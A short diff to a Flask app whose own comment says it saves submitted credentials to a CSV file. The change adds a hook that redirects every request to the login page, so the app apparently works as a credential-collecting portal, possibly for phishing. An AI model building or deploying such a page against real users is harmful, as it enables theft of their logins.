@@ -1,12 +1,18 @@
 
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect, url_for
 import csv
 import os
 
 app = Flask(__name__)
 
 # The name of the file to save credentials to
-LOG_FILE = 'logins.csv'
+LOG_FILE = os.path.join(os.path.dirname(__file__), '..', 'data', 'logins.csv')
+
+@app.before_request
+def before_request():
+    """Redirect all requests to the login page, except for the login page itself and the login submission."""
+    if request.path not in ['/', '/login']:
+        return redirect(url_for('home'))
 
 @app.route('/')
 def home():
